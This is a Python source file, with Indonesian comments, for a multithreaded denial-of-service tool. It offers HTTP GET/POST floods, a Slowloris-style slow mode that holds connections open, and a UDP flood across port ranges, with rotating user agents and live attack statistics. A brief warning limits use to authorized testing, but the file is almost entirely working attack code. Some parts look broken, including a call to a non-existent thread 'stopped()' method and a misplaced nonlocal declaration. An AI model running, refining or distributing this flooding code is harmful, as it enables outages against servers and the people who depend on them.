import socket
import threading
import random
import sys
import time
import logging
import selectors # Module untuk I/O non-blocking
import queue    # Untuk antrian permintaan
from colorama import init, Fore

# --- Inisialisasi ---
init()
LOG_FILENAME = 'attack_log.txt'
logging.basicConfig(filename=LOG_FILENAME, level=logging.INFO,
                    format='%(asctime)s - %(levelname)s - %(message)s')

# --- Banner ---
BANNER = Fore.CYAN + r"""
KUMPULAN PARA MENTOR MODUS DUIT
____   ___   ___              _     
|___ \ / _ \ / _ \   _ __ ___ | |__  
  __) | | | | | | | | '_ ` _ \| '_ \ 
 / __/| |_| | |_| | | | | | | | |_) |
|_____|\___/ \___/  |_| |_| |_|_.__/ 
  ADAKAH SERATUS BUAT BELI DATA ??                                   
"""
print(BANNER)

# --- Statistik Global & Lock ---
sent_requests_total = 0 # Total permintaan yang berhasil dikirim
active_connections = 0  # Jumlah koneksi aktif
error_count = 0
server_errors = 0       # Kode status 4xx/5xx
lock = threading.Lock()

# --- User Agents (Diperbanyak) ---
USER_AGENTS = [
    "Mozilla/5.0 (Linux; Android 10; SM-G975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; SM-N975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 9; SM-G960F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.101 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 8.0.0; SM-G955F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 7.0; SM-G930F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.109 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 6.0.1; SM-G935F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.141 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; Redmi Note 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; Mi 9T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; Redmi Note 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; Mi A3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; Mi 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; Redmi Note 9 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_4_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.91 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; HMD Global Nokia 7.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36",
]

# --- Helper Functions ---
def get_random_user_agent():
    return random.choice(USER_AGENTS)

def generate_random_string(length=100):
    characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
    return ''.join(random.choice(characters) for _ in range(length))

def parse_http_status(response_data):
    """Mencoba mengurai kode status HTTP dari data respons."""
    if not response_data:
        return None, "No Response Data"
    try:
        response_str = response_data.decode('utf-8', errors='ignore')
        if "HTTP/" in response_str:
            status_line = response_str.split('\r\n')[0]
            parts = status_line.split(' ')
            if len(parts) >= 2:
                return parts[1], status_line # Return code and full line
        return None, "Non-HTTP Response"
    except Exception:
        return None, "Error Parsing Response"

def generate_http_request(target, method='GET', mode='normal'):
    """Menghasilkan permintaan HTTP."""
    random_path = f"/?{generate_random_string(10)}" # Path acak
    
    headers = [
        f"{method.upper()} {random_path} HTTP/1.1",
        f"Host: {target}",
        f"User-Agent: {get_random_user_agent()}",
        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Accept-Language: en-US,en;q=0.5",
        "Connection: keep-alive",
        "Upgrade-Insecure-Requests: 1",
    ]

    body_data = b""
    if method.upper() == 'POST':
        post_payload_str = f"user={generate_random_string(20)}&pass={generate_random_string(20)}&data={generate_random_string(50)}"
        body_data = post_payload_str.encode('utf-8', errors='ignore')
        headers.append(f"Content-Type: application/x-www-form-urlencoded")
        headers.append(f"Content-Length: {len(body_data)}")
    
    # Header yang berbeda untuk mode 'slow' agar lebih minimalis
    if mode == 'slow':
        headers = [
            f"{method.upper()} {random_path} HTTP/1.1",
            f"Host: {target}",
            f"User-Agent: {get_random_user_agent()}",
            "Accept: */*", # Minimalis
            "Accept-Encoding: identity", # Matikan encoding gzip/deflate
            "Connection: keep-alive",
        ]
        if method.upper() == 'POST':
            # Untuk POST di mode slow, bisa kirim header content-length tapi tanpa body besar di awal
            # Atau kirim body kecil per batch
            post_payload_str = f"data={generate_random_string(10)}" # Payload kecil
            body_data = post_payload_str.encode('utf-8', errors='ignore')
            headers.append(f"Content-Type: application/x-www-form-urlencoded")
            headers.append(f"Content-Length: {len(body_data)}")

    headers.append("") # Akhir header
    
    request = "\r\n".join(headers)
    if body_data:
        request += "\r\n" + body_data.decode('utf-8', errors='ignore')
        
    return request

def generate_udp_packet(target_ip, target_port):
    payload = b"".join(random.choice(b"abcdefghijklmnopqrstuvwxyz0123456789") for _ in range(random.randint(500, 1000)))
    return payload

# --- Fungsi HTTP Attack dengan Multiple Sockets & Slowloris-like ---
def http_attack_advanced(target, port, method='GET', mode='normal', num_sockets=100):
    global sent_requests_total, error_count, active_connections, server_errors
    
    # Antrian untuk permintaan yang perlu dikirim
    request_queue = queue.Queue()
    
    # Isi antrian dengan permintaan awal
    for _ in range(num_sockets * 2): # Isi antrian lebih banyak dari jumlah soket
        request_queue.put(generate_http_request(target, method, mode))

    # Selector untuk menangani event pada soket
    sel = selectors.DefaultSelector()
    
    open_sockets = [] # List untuk menyimpan socket yang aktif

    # Fungsi untuk membuka koneksi baru
    def open_connection():
        nonlocal active_connections
        if active_connections >= num_sockets:
            return
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.setblocking(False) # Penting: set ke non-blocking untuk selector
            sock.settimeout(5) # Timeout untuk koneksi
            sock.connect((target, port))
            
            # Daftarkan soket ke selector untuk event WRITE
            sel.register(sock, selectors.EVENT_WRITE, data={'method': method, 'mode': mode, 'request_sent': False})
            
            with lock:
                active_connections += 1
                logging.info(f"New connection opened to {target}:{port}. Active: {active_connections}")
                
        except (socket.gaierror, socket.timeout, ConnectionRefusedError, OSError) as e:
            with lock:
                error_count += 1
            # logging.warning(f"Failed to open connection to {target}:{port}: {e}")
            if sock: sock.close()
        except Exception as e:
            with lock:
                error_count += 1
            logging.error(f"Unexpected error opening connection: {e}")
            if sock: sock.close()

    # Fungsi untuk menutup koneksi
    def close_connection(sock):
        nonlocal active_connections
        try:
            sel.unregister(sock)
            sock.close()
            with lock:
                active_connections -= 1
                logging.info(f"Connection closed to {target}:{port}. Active: {active_connections}")
        except Exception as e:
            logging.error(f"Error closing connection: {e}")

    # Buka koneksi awal
    for _ in range(num_sockets):
        open_connection()

    start_time = time.time()
    idle_loops = 0

    # Loop utama untuk mengelola koneksi
    while True:
        # Periksa apakah thread lain ingin berhenti (misal: KeyboardInterrupt)
        if threading.current_thread().stopped():
            break

        # Coba buka koneksi baru jika masih di bawah batas num_sockets
        if active_connections < num_sockets:
            open_connection()
        
        # Dapatkan event dari selector
        events = sel.select(timeout=1.0) # Tunggu event dengan timeout 1 detik
        
        if not events and active_connections == 0: # Jika tidak ada event dan tidak ada koneksi aktif
            idle_loops += 1
            if idle_loops > 10: # Jika diam selama 10 detik, mungkin ada masalah
                logging.warning(f"No active connections or events for {target}:{port}. Exiting thread.")
                break
            continue
        else:
            idle_loops = 0 # Reset jika ada aktivitas

        for key, mask in events:
            sock = key.fileobj
            data = key.data

            # --- Event WRITE: Siap untuk mengirim data ---
            if mask & selectors.EVENT_WRITE:
                try:
                    # Jika belum mengirim request utama, kirim
                    if not data['request_sent']:
                        request_str = request_queue.get_nowait() # Ambil permintaan dari antrian
                        request_bytes = request_str.encode('utf-8', errors='ignore')
                        
                        # Kirim permintaan
                        sock.sendall(request_bytes)
                        
                        with lock:
                            sent_requests_total += 1
                        
                        data['request_sent'] = True # Tandai bahwa permintaan utama sudah terkirim
                        
                        # Jika mode 'slow', kita perlu terus mengirim data kecil
                        if data['mode'] == 'slow':
                            # Kirim header tambahan atau sedikit data untuk menjaga koneksi hidup
                            # Ini bisa berupa header kosong, atau data kecil
                            slow_data = f"\r\nKeep-Alive: {random.randint(1, 10000)}"
                            sock.sendall(slow_data.encode('utf-8', errors='ignore'))
                            # logging.info(f"Sent slow data chunk to {target}:{port}")

                        # Daftarkan soket untuk event READ
                        sel.modify(sock, selectors.EVENT_READ, data=data)
                    else: # Jika permintaan utama sudah terkirim (misal: untuk mode 'slow')
                        # Terus kirim data kecil secara berkala di mode 'slow'
                        if data['mode'] == 'slow':
                            try:
                                # Kirim header tambahan atau sedikit data secara berkala
                                slow_data = f"\r\nX-Ignore: {random.randint(10000, 99999)}"
                                sock.sendall(slow_data.encode('utf-8', errors='ignore'))
                                # logging.info(f"Sent slow data chunk to {target}:{port}")
                            except OSError as e:
                                logging.warning(f"Error sending slow data to {target}:{port}: {e}")
                                close_connection(sock)
                            
                except (OSError, socket.timeout) as e:
                    logging.warning(f"Write error for {target}:{port}: {e}")
                    close_connection(sock)
                except Exception as e:
                    logging.error(f"Unexpected error during write event: {e}")
                    close_connection(sock)

            # --- Event READ: Menerima respons dari server ---
            if mask & selectors.EVENT_READ:
                try:
                    response_chunk = sock.recv(1024) # Baca sejumlah byte
                    if response_chunk:
                        # Kita menerima respons, bisa dicatat atau dianalisis
                        status_code, status_line = parse_http_status(response_chunk)
                        
                        if status_code and status_code.startswith('2'): # Sukses
                             # logging.info(f"Received {status_code} from {target}:{port}")
                             pass
                        elif status_code and (status_code.startswith('4') or status_code.startswith('5')): # Error
                            with lock:
                                server_errors += 1
                            logging.warning(f"Server Error ({status_code}) from {target}:{port}. Line: {status_line}. Snippet: {response_chunk[:100].decode('utf-8', errors='ignore')}...")
                        else: # Non-HTTP atau tidak terurai
                             # logging.info(f"Received non-HTTP or unparsed data from {target}:{port}. Snippet: {response_chunk[:100].decode('utf-8', errors='ignore')}...")
                             pass
                        
                        # Jika menerima respons, kita bisa putus koneksi atau tetap buka
                        # Tergantung strategi, untuk Slowloris kita ingin koneksi tetap buka
                        if data['mode'] == 'normal': # Jika mode normal, tutup setelah dapat respons
                           close_connection(sock)
                        # else: mode 'slow', biarkan koneksi terbuka tapi daftarkan lagi untuk WRITE
                        # sel.modify(sock, selectors.EVENT_WRITE, data=data) # Siap kirim data lagi
                        
                    else: # Koneksi ditutup oleh server
                        logging.info(f"Server closed connection {target}:{port}.")
                        close_connection(sock)
                        
                except (socket.timeout, OSError) as e: # Timeout saat membaca atau error OS
                    logging.warning(f"Read error for {target}:{port}: {e}. Closing connection.")
                    close_connection(sock)
                except Exception as e:
                    logging.error(f"Unexpected error during read event: {e}")
                    close_connection(sock)

        # Tambahkan jeda kecil agar tidak membebani CPU terlalu banyak
        time.sleep(0.001)

    # Tutup semua soket yang tersisa saat thread berhenti
    for sock in open_sockets:
        close_connection(sock)
    sel.close()

# --- Fungsi UDP Attack (tetap sama) ---
def udp_attack(target_ip, target_port):
    global sent_requests_total, error_count
    while True:
        s = None
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.settimeout(2)

            udp_payload = generate_udp_packet(target_ip, target_port)
            s.sendto(udp_payload, (target_ip, target_port))
            
            with lock:
                sent_requests_total += 1
            
        except socket.gaierror:
            with lock:
                error_count += 1
            break
        except socket.timeout:
            with lock:
                error_count += 1
        except OSError as e:
            with lock:
                error_count += 1
        except Exception as e:
            with lock:
                error_count += 1
        finally:
            if s:
                s.close()
        
        time.sleep(random.uniform(0.001, 0.005))

# --- Fungsi untuk menampilkan statistik secara berkala ---
def stats_display(stop_event):
    while not stop_event.is_set():
        with lock:
            current_sent = sent_requests_total
            current_errors = error_count
            current_active = active_connections
            current_srv_err = server_errors
        
        progress_bar = (
            f"[{Fore.CYAN}STATS{Fore.RESET}] Sent: {Fore.GREEN}{current_sent}{Fore.RESET} | "
            f"Active Con: {Fore.BLUE}{current_active}{Fore.RESET} | "
            f"Srv Err: {Fore.YELLOW}{current_srv_err}{Fore.RESET} | "
            f"Errors: {Fore.RED}{current_errors}{Fore.RESET} | "
            f"Log: {LOG_FILENAME}"
        )
        sys.stdout.write('\r' + progress_bar + ' ' * 10)
        sys.stdout.flush()
        
        time.sleep(1)
    sys.stdout.write('\n')
    sys.stdout.flush()

# --- Main Execution ---
if __name__ == "__main__":
    print(f"{Fore.YELLOW}!!! PERINGATAN !!!{Fore.RESET}")
    print(f"{Fore.YELLOW}Script ini adalah alat PENGUJIAN KEAMANAN yang kuat.{Fore.RESET}")
    print(f"{Fore.YELLOW}Gunakan HANYA pada sistem yang Anda miliki atau memiliki izin TERTULIS.{Fore.RESET}")
    print(f"{Fore.YELLOW}Penggunaan ILEGAL berakibat pada HUKUMAN PIDANA.{Fore.RESET}")
    print(f"{Fore.RED}Tekan CTRL+C dalam 5 detik untuk membatalkan...{Fore.RESET}")
    
    try:
        time.sleep(5)
        
        if len(sys.argv) < 6: # Membutuhkan 6 argumen: IP, PORT, THREADS, TYPE, MODE, [HTTP_METHOD]
            print(f"\nUsage: python3 {sys.argv[0]} <TARGET_IP> <PORT> <THREADS> <ATTACK_TYPE> <MODE> [HTTP_METHOD]")
            print("ATTACK_TYPE: 'http' or 'udp'")
            print("MODE: 'normal' (fast flood) or 'slow' (slowloris-like)")
            print("HTTP_METHOD (optional for 'http' type): 'GET' (default) or 'POST'")
            print("\nExample:")
            print(f"  HTTP Normal GET:  python3 {sys.argv[0]} 192.168.1.100 80 500 http normal GET")
            print(f"  HTTP Slow POST:   python3 {sys.argv[0]} 192.168.1.100 8080 200 http slow POST")
            print(f"  UDP Flood:        python3 {sys.argv[0]} 192.168.1.100 53 1000 udp")
            sys.exit(1)
            
        target_ip = sys.argv[1]
        port_arg = sys.argv[2]
        attack_type = sys.argv[4].lower()
        mode = sys.argv[5].lower()
        http_method = 'GET'

        # Validasi mode
        if mode not in ['normal', 'slow']:
            print(f"Error: Invalid MODE '{mode}'. Use 'normal' or 'slow'.")
            sys.exit(1)

        # Validasi HTTP Method jika tipe adalah http
        if attack_type == 'http':
            if len(sys.argv) > 6:
                http_method = sys.argv[6].upper()
                if http_method not in ['GET', 'POST']:
                    print(f"Error: Invalid HTTP method '{http_method}'. Use 'GET' or 'POST'.")
                    sys.exit(1)
            if mode == 'slow' and http_method == 'POST':
                 print(f"{Fore.YELLOW}Warning: POST method in 'slow' mode might be less effective or behave unexpectedly.{Fore.RESET}")


        # Parsing Port (sama seperti sebelumnya)
        ports_to_attack = []
        if '-' in port_arg:
            try:
                start_port, end_port = map(int, port_arg.split('-'))
                if not (1 <= start_port <= 65535 and 1 <= end_port <= 65535 and start_port <= end_port):
                    raise ValueError("Invalid port range.")
                ports_to_attack = list(range(start_port, end_port + 1))
            except ValueError as e:
                print(f"Error parsing port range '{port_arg}': {e}")
                sys.exit(1)
        else:
            try:
                single_port = int(port_arg)
                if not (1 <= single_port <= 65535):
                    raise ValueError("PORT must be between 1 and 65535.")
                ports_to_attack.append(single_port)
            except ValueError as e:
                print(f"Error: {e}")
                sys.exit(1)
        
        # Validasi argumen lainnya
        try:
            threads_per_port = int(sys.argv[3]) # Nama variabel diubah agar lebih jelas
            if threads_per_port <= 0:
                raise ValueError("THREADS must be a positive integer.")
            if attack_type not in ['http', 'udp']:
                raise ValueError("ATTACK_TYPE must be 'http' or 'udp'.")
        except ValueError as e:
            print(f"Error: {e}")
            sys.exit(1)

        if not ports_to_attack:
            print("Error: No valid ports specified.")
            sys.exit(1)

        print(f"\n{Fore.GREEN}Starting {attack_type.upper()} ({mode.upper()}) attack on {target_ip} on ports {ports_to_attack} with {threads_per_port} threads/port (Method: {http_method})...{Fore.RESET}")
        logging.info(f"Starting {attack_type.upper()} ({mode.upper()}) attack on {target_ip} on ports {ports_to_attack} with {threads_per_port} threads/port (Method: {http_method}).")

        # Thread untuk menampilkan statistik
        stop_event = threading.Event()
        stats_thread = threading.Thread(target=stats_display, args=(stop_event,))
        stats_thread.daemon = True
        stats_thread.start()

        # --- Pengelolaan Thread untuk Serangan ---
        attack_threads = []
        
        # --- Konfigurasi untuk HTTP Attack ---
        # Kita tentukan jumlah soket per thread berdasarkan mode
        NUM_SOCKETS_PER_THREAD = 50 # Jumlah soket per thread untuk http_attack_advanced
        if mode == 'slow':
            NUM_SOCKETS_PER_THREAD = 10 # Mode slow tidak perlu terlalu banyak soket per thread, tapi koneksi tetap buka
        
        if attack_type == 'http':
            for port in ports_to_attack:
                for _ in range(threads_per_port): # Buat 'threads_per_port' thread untuk port ini
                    # Membuat thread untuk http_attack_advanced
                    thread = threading.Thread(target=http_attack_advanced, 
                                              args=(target_ip, port, http_method, mode, NUM_SOCKETS_PER_THREAD))
                    # Kita perlu cara untuk menghentikan thread ini dari luar
                    # Ini agak rumit dengan selector, kita akan gunakan flag sederhana
                    thread.daemon = True # Biarkan utama berhenti
                    attack_threads.append(thread)
                    thread.start()

        elif attack_type == 'udp': # UDP attack tetap sama
            for port in ports_to_attack:
                for _ in range(threads_per_port):
                    thread = threading.Thread(target=udp_attack, args=(target_ip, port))
                    thread.daemon = True
                    attack_threads.append(thread)
                    thread.start()
        
        # Jaga agar program utama tetap berjalan
        while True:
            time.sleep(1)
            
    except KeyboardInterrupt:
        print("\nAttack stopped by user. Exiting...")
        stop_event.set()
        # Secara kasar menghentikan thread yang berjalan
        # Ini mungkin tidak membersihkan semua soket dengan sempurna, tapi cukup untuk keluar
        for t in attack_threads:
            t.join(timeout=0.1) # Coba berhenti dengan cepat
        stats_thread.join(timeout=1)
        logging.info("Attack stopped by user.")
        sys.exit(0)
    except Exception as e:
        print(f"\nAn unexpected error occurred in the main thread: {e}")
        stop_event.set()
        logging.critical(f"Main thread error: {e}")
        sys.exit(1)

